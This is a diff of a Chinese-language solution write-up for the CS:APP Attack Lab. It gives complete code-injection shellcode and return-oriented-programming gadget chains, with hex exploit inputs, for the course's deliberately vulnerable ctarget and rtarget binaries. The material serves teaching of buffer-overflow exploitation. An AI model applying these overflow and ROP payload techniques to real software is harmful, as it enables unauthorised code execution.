@@ -2,13 +2,17 @@
 
 ## 问题描述
 
-【设定】现有两个存在 ***缓冲区溢出 (buffer overflow)*** 风险的 x86-64 可执行文件：
+### 设定
+
+现有两个存在 ***缓冲区溢出 (buffer overflow)*** 风险的 x86-64 可执行文件：
 
 - `ctarget` 可能遭受 ***代码注入 (code injection)*** 攻击（对应第 1~3 关）。
-- `rtarget` 可能遭受 ***ROP (return-oriented programming)*** 攻击（对应第 4~6 关）。
+- `rtarget` 可能遭受 ***ROP (return-oriented programming)*** 攻击（对应第 4~5 关）。
 - [此处](http://csapp.cs.cmu.edu/3e/target1.tar)可下载这两个文件。本地运行时应开启 `-q` 选项，以避免连接评分服务器。
 
-【任务】利用上述漏洞，植入攻击代码，改变程序行为。[此处](http://csapp.cs.cmu.edu/3e/attacklab.pdf)可下载详细说明。
+### 任务
+
+利用上述漏洞，植入攻击代码，改变程序行为。[此处](http://csapp.cs.cmu.edu/3e/attacklab.pdf)可下载详细说明。
 
 ## `ctarget`
 
@@ -36,10 +40,10 @@ Dump of assembler code for function getbuf:
 End of assembler dump.
 ```
 
-由此可见：旧栈顶（即 `R[rsp]` 的旧值）位于 `&buf[0]` 后 40 字节处。在调试器中，设断点于 `<+4>` 处，检查始于 `R[rsp]+40` 的 8 字节：
+由此可见：旧栈顶（即 `R[rsp]` 的旧值）位于 `&buf[0]` 后 40 字节处。在调试器中，设断点于 `<+4>` 处，查看始于 `R[rsp]+40` 的 8 字节：
 
-```shell
-(lldb) x/1gx $rsp+40
+```nasm
+(lldb) x/8bx $rsp+40
 0x5561dca0: 0x0000000000401976
 ```
 
@@ -55,7 +59,7 @@ Dump of assembler code for function test:
 ; ...
 ```
 
-故只需将 `touch1()` 的地址 `0x00000000004017c0` 植入始于 `buf[40]` 的 8 字节，逻辑上相当于在 C 代码中植入以下赋值语句：
+故只需将 `touch1()` 的地址 `0x00000000004017c0` 植入始于 `&buf[40]` 的 8 字节，逻辑上相当于在 C 代码中植入以下赋值语句：
 
 ```c
 buf[40] = 0xc0;
@@ -109,17 +113,18 @@ PASS: Would have posted the following:
 ### 第二关
 
 需要植入的指令为：
-```gas
-# exploit.s
-movl  $0x59b997fa, %edi # cookie
-pushq $0x004017ec       # address of touch2()
-retq
+```nasm
+; exploit.s
+mov  edi, 0x59b997fa ; cookie
+push 0x004017ec      ; address of touch2()
+ret
 ```
 先汇编，再反汇编：
 ```shell
-$ gcc -c exploit.s && objdump -d exploit.o
+$ nasm -f elf64 -o exploit.o exploit.s
+$ objdump -d exploit.o
 ```
-得以下输出：
+得以下输出（⚠️ 汇编代码换成了 [ATT 格式](../../3_machine_level_programming.md#汇编代码格式)）：
 ```
 exploit.o:     file format elf64-x86-64
 
@@ -161,7 +166,7 @@ PASS: Would have posted the following:
 
 ### 第三关
 
-先用 `man ascii` 查到 `59b997fa` 的十六进制表示：
+先用 `man ascii` 查到字符串 `59b997fa` 的十六进制表示：
 
 ```
 35 39 62 39 39 37 66 61
@@ -169,20 +174,20 @@ PASS: Would have posted the following:
 
 与前一关不同，这里不能直接将其写入 `getbuf()` 的帧内，而应将其压入栈内（并补一个空字符），故需植入的指令为：
 
-```gas
-# exploit.s
-pushq $0x0 # 字符串尾
-movabsq $0x6166373939623935, %rdi # 直接压栈无法编译
-pushq %rdi                        # 故分作两步
-movq  %rsp, %rdi # 设置 touch3() 的实参
-pushq $0x4018fa  # touch3() 的地址
-retq
+```nasm
+; exploit.s
+push 0x0 ; 字符串尾
+mov  rdi, 0x6166373939623935 ; 直接压栈无法编译
+push rdi                     ; 故分作两步
+mov  rdi, rsp ; 设置 touch3() 的实参
+push 0x4018fa ; touch3() 的地址
+ret
 ```
 
-先汇编，再反汇编，得以下输出：
+先汇编，再反汇编：
 
 ```shell
-$ gcc -c exploit.s && objdump -d exploit.o
+$ nasm -f elf64 exploit.s && objdump -d exploit.o
 ```
 
 得以下输出：
@@ -194,11 +199,11 @@ exploit.o:     file format elf64-x86-64
 Disassembly of section .text:
 
 0000000000000000 <.text>:
-   0:   48 bf 35 39 62 39 39    movabs $0x6166373939623935,%rdi
-   7:   37 66 61 
-   a:   57                      push   %rdi
-   b:   48 89 e7                mov    %rsp,%rdi
-   e:   6a 00                   pushq  $0x0
+   0:   6a 00                   pushq  $0x0
+   2:   48 bf 35 39 62 39 39    movabs $0x6166373939623935,%rdi
+   9:   37 66 61 
+   c:   57                      push   %rdi
+   d:   48 89 e7                mov    %rsp,%rdi
   10:   68 fa 18 40 00          pushq  $0x4018fa
   15:   c3                      retq
 ```
@@ -207,11 +212,11 @@ Disassembly of section .text:
 
 ```c
 /* exploit.txt */
-/* 0x5561dc78 */ 6a 00 /* pushq $0x0 */
-/* 0x5561dc7a */ 48 bf 35 39 62 39 39 37 66 61 /* movabsq */
-/* 0x5561dc84 */ 57 /* pushq %rdi */
-/* 0x5561dc85 */ 48 89 e7 /* movq %rsp,%rdi */
-/* 0x5561dc88 */ 68 fa 18 40 00 /* pushq $0x4018fa */ 
+/* 0x5561dc78 */ 6a 00 /* pushq */
+/* 0x5561dc7a */ 48 bf 35 39 62 39 39 37 66 61 /* movabs */
+/* 0x5561dc84 */ 57 /* push */
+/* 0x5561dc85 */ 48 89 e7 /* mov */
+/* 0x5561dc88 */ 68 fa 18 40 00 /* pushq */ 
 /* 0x5561dc8d */ c3 /* retq */ 90 90
 /* 0x5561dc90 */ 90 90 90 90 90 90 90 90
 /* 0x5561dc98 */ 90 90 90 90 90 90 90 90
@@ -243,26 +248,26 @@ PASS: Would have posted the following:
 先用 `objdump -d` 获得 `rtarget` 的编码：
 
 ```shell
-$ objdump -d rtarget > rtarget.d
+$ objdump -d -x86-asm-syntax=intel rtarget > rtarget.d
 ```
 
 在 `start_farm` 与 `mid_farm` 之间（可存入 `half_farm.d` 以便检索），编码 `0xc3` 共出现 13 次 —— 可用指令只能取自这 13 处。
 
 `cookie` 的编码几乎不可能出现在 `half_farm.d` 内，故不能像[第二关](#第二关)那样用 `mov` 直接移入寄存器，而必须借 `getbuf()` 植入栈内，并借 `pop` 指令取出。因此，实现 `touch2(cookie)` 的最简单的方案为
 
-```gas
-# M[R[rsp]] = 0x59b997fa, which is my cookie
-popq %rdi # 5f (90)*
-# M[R[rsp]] = 0x4017ec, which is the address of touch2()
-retq      # c3
+```nasm
+; M[R[rsp]] = 0x59b997fa, which is my cookie
+pop rdi ; 5f (90)*
+; M[R[rsp]] = 0x4017ec, which is the address of touch2()
+ret     ; c3
 ```
 
 但 `5f (90)* c3` 并没有出现在 `half_farm.d` 内，故需借其他寄存器过渡：
 
-```gas
-popq %rax       # 58 (90)* c3
-movq %rax, %rdi # 48 89 c7 (90)* c3
-retq            # c3
+```nasm
+pop rax      ; 58 (90)* c3
+mov rdi, rax ; 48 89 c7 (90)* c3
+ret          ; c3
 ```
 
 在 `half_farm.d` 内检索得：
@@ -306,7 +311,17 @@ PASS: Would have posted the following:
 
 在 `start_farm` 与 `end_farm` 之间（可存入 `full_farm.d` 以便检索），编码 `0xc3` 共出现 50 次 —— 可用指令只能取自这 50 处。
 
-- 用正则表达式 `48 89 [cdef]` 搜索，得 9 处：
+本关难点在于：
+
+- 退出 `getbuf()` 时，存于栈内的字符串必须完整地位于栈顶以上，即字符串的首地址不得小于 `R[rsp] + 8`，否则 `touch3()` 或 `hexmatch()` 的帧将破坏该字符串。
+- 除 `add_xy()` 中的 `leaq` 指令外，没有提供其他算术运算指令，因此无法直接算出 `R[rsp]+8` 的值。
+- 除退出 `getbuf()` 时有 `R[rax] == 1` 外，没有提供其他常数 —— 特别是地址运算中常用的 `8`、`16`、`32` 等。
+
+一种可行（但较为繁琐）的方案为：先（反复）用 `add_xy()` 及 `R[rax]` 构造出所需的地址偏移量，再用 `add_xy()` 算出字符串的地址。
+
+可用的 `mov` 指令如下：
+
+- 用正则表达式 `48 89 [cdef]` 搜索可用的 `movq` 指令，得 9 处：
   - `48 89 c7` 出现 3 次，其中可用作 `movq %rax, %rdi` 的有
     - 始于 `0x4019a2` 的 `48 89 c7 c3`
     - 始于 `0x4019c5` 的 `48 89 c7 90 c3`
@@ -314,7 +329,7 @@ PASS: Would have posted the following:
     - 始于 `0x401a06` 的 `48 89 e0 c3`
     - 始于 `0x401aad` 的 `48 89 e0 90 c3`
   - 不存以 `%rsp` 为目标的 `movq` 指令（即 `48 89 [cdef][4c]`），故 `%rsp` 只能被 `popq` 即 `retq` 修改。
-- 置 `0` 操作只能借 `movl` 实现。用正则表达式 `89 [cdef]` 搜索，并排除  `48 89 [cdef]`，得 16 处：
+- 用正则表达式 `89 [cdef]` 搜索可用的 `movl` 指令，并排除  `48 89 [cdef]` 即 `movq` 指令，得 16 处：
   - `89 c2` 出现 6 次，其中可用作 `movl %eax, %edx` 的有
     - 始于 `0x4019dd` 的 `89 c2 90 c3`
     - 始于 `0x401a42` 的 `89 c2 84 c0 c3`
@@ -324,50 +339,62 @@ PASS: Would have posted the following:
   - `89 d1` 出现 4 次，其中可用作 `movl %edx, %ecx` 的有
     - 始于 `0x401a34` 的 `89 d1 38 c9 c3`
     - 始于 `0x401a68` 的 `89 d1 08 db c3`
-  - `89 e0` 出现 2 次
+  - `89 e0` 出现 2 次，略去不用。
 
-```gas
-retq # to 0x4019a2 --- the address of `movq %rax, %rdi`
-# R[rax] == 1
-movq %rax, %rdi # 48 89 c7
-retq # to 0x4019dd --- the address of `movl %eax, %edx`
-movl %eax, %edx # 89 c2
-retq # to 0x401a34 --- the address of `movl %edx, %ecx`
-movl %edx, %ecx # 89 d1 (38 c9)
-retq # to 0x401a13 --- the address of `movl %ecx, %esi`
-movl %ecx, %esi # 89 ce (90 90)
-retq # to 0x4019d6 --- the address of `add_xy()`
-leaq (%rdi,%rsi), %rax # 48 8d 04 37
-retq # to 0x4019a2 --- the address of `movq %rax, %rdi`
-# R[rax] == 2, R[rsi] == 1
-# ...
-# R[rax] == 4, R[rsi] == 2
-# ...
-# R[rax] == 8, R[rsi] == 4
-# ...
-# R[rax] == 16, R[rsi] == 8
-# ...
-# R[rax] == 32, R[rsi] == 16
-movq %rax, %rdi # 48 89 c7
-retq # to 0x4019dd --- the address of `movl %eax, %edx`
-movl %eax, %edx # 89 c2
-retq # to 0x401a34 --- the address of `movl %edx, %ecx`
-movl %edx, %ecx # 89 d1 (38 c9)
-retq # to 0x401a13 --- the address of `movl %ecx, %esi`
-movl %ecx, %esi # 89 ce (90 90)
-retq # to 0x401a06 --- the address of `movq %rsp, %rax`
-# sval = R[rsp] + 32, R[rsi] = 32
-movq %rsp, %rax # 48 89 e0
-retq # to 0x4019a2 --- the address of `movq %rax, %rdi`
-movq %rax, %rdi # 48 89 c7
-retq # to 0x4019d6 --- the address of `add_xy()`
-leaq (%rdi,%rsi), %rax
-retq # to 0x4019a2 --- the address of `movq %rax, %rdi`
-movq %rax, %rdi # 48 89 c7
-# sval = R[rsp] + 8
-retq # to `0x4018fa`, which is the address of `touch3()`
-# sval = R[rdi]
+借助这些指令，可以构造出 `2` 的整数次幂：
+
+```nasm
+ret ; to 0x4019a2 --- the address of `mov rdi, rax`
+; R[rax] == 1
+mov rdi, rax ; 48 89 c7
+ret ; to 0x4019dd --- the address of `mov edx, eax`
+mov edx, eax ; 89 c2
+ret ; to 0x401a34 --- the address of `mov ecx, edx`
+mov ecx, edx ; 89 d1 (38 c9)
+ret ; to 0x401a13 --- the address of `mov esi, ecx`
+mov esi, ecx ; 89 ce (90 90)
+ret ; to 0x4019d6 --- the address of `add_xy()`
+lea rax, [rdi + rsi] ; 48 8d 04 37
+ret ; to 0x4019a2 --- the address of `mov rdi, rax`
+; R[rax] == 2, R[rsi] == 1, R[rsi] == 1
 ```
+
+除第一行外，其他部分重复四次，可得
+
+```nasm
+; R[rax] == 32, R[rdi] == 16, R[rsi] == 16
+```
+
+将 `R[rax]` 中的 `32` 移入 `R[rsi]`，但最后一步的返回地址换为 `mov rax, rsp` 的地址：
+
+```nasm
+mov rdi, rax ; 48 89 c7 --- optional
+ret ; to 0x4019dd --- the address of `mov edx, eax`
+mov edx, eax ; 89 c2
+ret ; to 0x401a34 --- the address of `mov ecx, edx`
+mov ecx, edx ; 89 d1 (38 c9)
+ret ; to 0x401a13 --- the address of `mov esi, ecx`
+mov esi, ecx ; 89 ce (90 90)
+ret ; to 0x401a06 --- the address of `mov rax, rsp`
+```
+
+期望 `sval` 始于 `R[rsp] + 32` 处，故作如下地址偏移计算：
+
+```nasm
+; sval = R[rsp] + 32, R[rsi] = 32
+mov rax, rsp ; 48 89 e0
+ret ; to 0x4019a2 --- the address of `mov rdi, rax`
+mov rdi, rax ; 48 89 c7
+ret ; to 0x4019d6 --- the address of `add_xy()`
+lea rax, [rdi + rsi]
+ret ; to 0x4019a2 --- the address of `mov rdi, rax`
+mov rdi, rax ; 48 89 c7
+; sval = R[rsp] + 8
+ret ; to `0x4018fa`, which is the address of `touch3()`
+; sval = R[rdi]
+```
+
+将上述指令整理为输入：
 
 ```c
 /* exploit.txt */
@@ -376,42 +403,42 @@ retq # to `0x4018fa`, which is the address of `touch3()`
 /* buf[16, 24) */ 90 90 90 90 90 90 90 90
 /* buf[24, 32) */ 90 90 90 90 90 90 90 90
 /* buf[32, 40) */ 90 90 90 90 90 90 90 90
-/* 000 */ a2 19 40 00 00 00 00 00
+/*  0  */ a2 19 40 00 00 00 00 00
 /* -01 */ dd 19 40 00 00 00 00 00
 /* -02 */ 34 1a 40 00 00 00 00 00
 /* -03 */ 13 1a 40 00 00 00 00 00
 /* -04 */ d6 19 40 00 00 00 00 00
-/*  1  */ a2 19 40 00 00 00 00 00
-/* -01 */ dd 19 40 00 00 00 00 00
-/* -02 */ 34 1a 40 00 00 00 00 00
-/* -03 */ 13 1a 40 00 00 00 00 00
-/* -04 */ d6 19 40 00 00 00 00 00
-/*  2  */ a2 19 40 00 00 00 00 00
-/* -01 */ dd 19 40 00 00 00 00 00
-/* -02 */ 34 1a 40 00 00 00 00 00
-/* -03 */ 13 1a 40 00 00 00 00 00
-/* -04 */ d6 19 40 00 00 00 00 00
-/*  4  */ a2 19 40 00 00 00 00 00
-/* -01 */ dd 19 40 00 00 00 00 00
-/* -02 */ 34 1a 40 00 00 00 00 00
-/* -03 */ 13 1a 40 00 00 00 00 00
-/* -04 */ d6 19 40 00 00 00 00 00
-/*  5  */ a2 19 40 00 00 00 00 00
-/* -01 */ dd 19 40 00 00 00 00 00
-/* -02 */ 34 1a 40 00 00 00 00 00
-/* -03 */ 13 1a 40 00 00 00 00 00
-/* -04 */ d6 19 40 00 00 00 00 00
-/*  6  */ a2 19 40 00 00 00 00 00
-/* -01 */ dd 19 40 00 00 00 00 00
-/* -02 */ 34 1a 40 00 00 00 00 00
-/* -03 */ 13 1a 40 00 00 00 00 00
-/* movq %rsp, %rax */ 06 1a 40 00 00 00 00 00
-/* movq %rax, %rdi */ a2 19 40 00 00 00 00 00
+/* -05 */ a2 19 40 00 00 00 00 00
+/* -06 */ dd 19 40 00 00 00 00 00
+/* -07 */ 34 1a 40 00 00 00 00 00
+/* -08 */ 13 1a 40 00 00 00 00 00
+/* -09 */ d6 19 40 00 00 00 00 00
+/* -10 */ a2 19 40 00 00 00 00 00
+/* -11 */ dd 19 40 00 00 00 00 00
+/* -12 */ 34 1a 40 00 00 00 00 00
+/* -13 */ 13 1a 40 00 00 00 00 00
+/* -14 */ d6 19 40 00 00 00 00 00
+/* -15 */ a2 19 40 00 00 00 00 00
+/* -16 */ dd 19 40 00 00 00 00 00
+/* -17 */ 34 1a 40 00 00 00 00 00
+/* -18 */ 13 1a 40 00 00 00 00 00
+/* -19 */ d6 19 40 00 00 00 00 00
+/* -20 */ a2 19 40 00 00 00 00 00
+/* -21 */ dd 19 40 00 00 00 00 00
+/* -22 */ 34 1a 40 00 00 00 00 00
+/* -23 */ 13 1a 40 00 00 00 00 00
+/* -24 */ d6 19 40 00 00 00 00 00
+/* -25 */ a2 19 40 00 00 00 00 00
+/* -26 */ dd 19 40 00 00 00 00 00
+/* -27 */ 34 1a 40 00 00 00 00 00
+/* -28 */ 13 1a 40 00 00 00 00 00
+/* mov rax, rsp */ 06 1a 40 00 00 00 00 00
+/* mov rdi, rax */ a2 19 40 00 00 00 00 00
 /* add_xy */ d6 19 40 00 00 00 00 00
-/* movq %rax, %rdi */ a2 19 40 00 00 00 00 00
+/* mov rdi, rax */ a2 19 40 00 00 00 00 00
 /* touch3 */ fa 18 40 00 00 00 00 00
 /* cookie */ 35 39 62 39 39 37 66 61
-/*  tail  */ 00 01 02 03 04 05
+/*  tail  */ 00
 ```
 
 ```
